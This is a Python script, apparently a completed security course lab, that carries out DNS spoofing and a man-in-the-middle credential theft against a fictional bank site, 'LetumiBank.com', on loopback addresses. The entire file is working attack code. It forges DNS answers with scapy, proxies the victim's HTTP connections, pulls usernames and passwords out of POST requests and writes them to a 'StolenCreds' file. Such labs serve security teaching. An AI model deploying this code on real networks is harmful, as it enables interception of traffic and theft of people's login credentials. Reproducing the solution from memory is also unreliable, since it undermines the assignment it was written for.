import os
import argparse
import socket
from scapy.all import *
import re

conf.L3socket = L3RawSocket
WEB_PORT = 8888
HOSTNAME = "LetumiBank.com"
BUFFER_SIZE = 8192


def resolve_hostname(hostname):
	# IP address of HOSTNAME. Used to forward tcp connection.
	# Normally obtained via DNS lookup.
	return "127.1.1.1"


def log_credentials(username, password):
	# Write stolen credentials out to file.
	# Do not change this.
	with open("lib/StolenCreds.txt", "wb") as fd:
		fd.write(str.encode("Stolen credentials: username=" + username + " password=" + password))


def check_credentials(client_data):
	# TODO: Take a block of client data and search for username/password credentials.
	# If found, log the credentials to the system by calling log_credentials().
	content = client_data.payload.load.decode('utf-8')
	m=re.match(r"username='(.*)'&password='(.*)'",content)
	if m is None:
		return
	uname, password = m.group(1), m.group(2)
	log_credentials(uname, password)


def handle_tcp_forwarding(client_socket):
	# Continuously intercept new connections from the client
	# and initiate a connection with the host in order to forward data
	load_layer("http")
	logged_out = False 

	while True:

		# TODO: accept a new connection from the client on client_socket and
		# create a new socket to connect to the actual host associated with hostname.
		dedicated_socket, client_address = client_socket.accept()

		# TODO: read data from client socket, check for credentials, and forward along to host socket.
		# Check for POST to '/post_logout' and exit after that request has completed.
		data = dedicated_socket.recv(BUFFER_SIZE)
		http_packet = scapy.layers.http.HTTPRequest(data)
		if http_packet.Method == b'POST':
			check_credentials(http_packet)
			if http_packet.Path == b'/post_logout':
				logged_out=True

		with_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		with_server.connect((resolve_hostname(HOSTNAME), WEB_PORT))
		with_server.send(data)
		reply = with_server.recv(BUFFER_SIZE)
		with_server.close()
		
		dedicated_socket.send(reply)
		dedicated_socket.close()

		if logged_out:
			exit(0)



def dns_callback(packet, source_ip, with_client):
	# TODO: Write callback function for handling DNS packets.
	# Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.

	if packet[DNS].qd.qname != b'LetumiBank.com.':
		return
	
	ip=IP(src=packet[IP].dst, dst=packet[IP].src, proto=packet[IP].proto)
	udp=UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
	dns=DNS(id=packet[DNS].id, qd=packet[DNS].qd, an=DNSRR(rdata=source_ip, rrname=packet[DNS].qd.qname, ttl=600, type="A"), qr=1, aa=1, rd=0, qdcount=1,ancount=1)
	
	send(ip/udp/dns, iface='lo')

	handle_tcp_forwarding(with_client)

def sniff_and_spoof(source_ip):
	# TODO: Open a socket and bind it to the attacker's IP and WEB_PORT.
	# This socket will be used to accept connections from victimized clients.
	with_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	with_client.bind((source_ip, WEB_PORT))
	with_client.listen(5)

	# TODO: sniff for DNS packets on the network. Make sure to pass source_ip
	# and the socket you created as extra callback arguments. 
	sniff(filter='udp dst port 53', prn=lambda x: dns_callback(x, source_ip, with_client), iface='lo')

def main():
	parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
	parser.add_argument('--source_ip', nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')
	args = parser.parse_args()

	sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
	# Change working directory to script's dir.
	# Do not change this.
	abspath = os.path.abspath(__file__)
	dirname = os.path.dirname(abspath)
	os.chdir(dirname)
	main()
